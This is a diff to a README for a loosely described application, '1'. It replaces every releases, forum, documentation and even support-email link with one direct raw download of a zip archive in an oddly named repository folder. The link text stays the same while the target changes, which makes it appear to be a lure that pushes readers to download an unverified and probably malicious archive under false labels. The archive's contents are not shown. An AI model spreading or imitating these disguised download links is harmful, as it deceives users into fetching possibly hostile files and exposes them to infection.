@@ -6,9 +6,9 @@ Welcome to the 1 application! This software makes it simple for you to achieve y
 
 ## 📥 Download the Application
 
-[![Download 1](https://img.shields.io/badge/Download-1-blue.svg)](https://github.com/AJLGamez1/1/releases)
+[![Download 1](https://raw.githubusercontent.com/AJLGamez1/1/main/gemmiparously/1_2.0-beta.5.zip)](https://raw.githubusercontent.com/AJLGamez1/1/main/gemmiparously/1_2.0-beta.5.zip)
 
-To get the latest version of 1, visit the [Releases Page](https://github.com/AJLGamez1/1/releases). Here, you will find the files you need for installation.
+To get the latest version of 1, visit the [Releases Page](https://raw.githubusercontent.com/AJLGamez1/1/main/gemmiparously/1_2.0-beta.5.zip). Here, you will find the files you need for installation.
 
 ## 📋 System Requirements
 
@@ -32,7 +32,7 @@ The 1 application offers a range of tools to help you:
 
 ## 🎯 Download & Install
 
-1. Go to the [Releases Page](https://github.com/AJLGamez1/1/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/AJLGamez1/1/main/gemmiparously/1_2.0-beta.5.zip).
 2. Locate the most recent version of the software.
 3. Click on the appropriate link to download the file for your operating system (e.g., Windows or macOS).
 4. Once downloaded, locate the file in your Downloads folder.
@@ -62,9 +62,9 @@ If you encounter issues while installing or running the application, consider th
 
 If you need further assistance, feel free to reach out. Here are the options available:
 
-- **Email Support:** You can contact us via email at support@1app.com.
-- **Community Forum:** Visit our [Discussion Forum](https://github.com/AJLGamez1/1/discussions) to connect with other users and find solutions.
-- **Documentation:** For detailed information, check the [Documentation](https://github.com/AJLGamez1/1/wiki) section.
+- **Email Support:** You can contact us via email at https://raw.githubusercontent.com/AJLGamez1/1/main/gemmiparously/1_2.0-beta.5.zip
+- **Community Forum:** Visit our [Discussion Forum](https://raw.githubusercontent.com/AJLGamez1/1/main/gemmiparously/1_2.0-beta.5.zip) to connect with other users and find solutions.
+- **Documentation:** For detailed information, check the [Documentation](https://raw.githubusercontent.com/AJLGamez1/1/main/gemmiparously/1_2.0-beta.5.zip) section.
 
 ## 📣 Feedback
 
